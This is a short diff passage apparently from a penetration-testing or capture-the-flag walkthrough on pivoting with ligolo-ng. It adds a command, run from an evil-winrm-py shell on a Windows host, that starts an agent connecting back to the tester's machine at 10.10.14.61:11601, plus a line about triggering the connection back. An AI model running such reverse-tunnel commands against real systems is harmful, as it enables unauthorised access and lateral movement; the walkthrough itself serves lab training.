@@ -330,6 +330,12 @@ ligolo-ng »
 ill start the proxy on my system
 
 ```python
+evil-winrm-py PS C:\Temp> ./agent.exe -connect 10.10.14.61:11601 --ignore-cert --retry
+```
+
+Ill then trigger a connection back to me
+
+```python
 
 ```
 
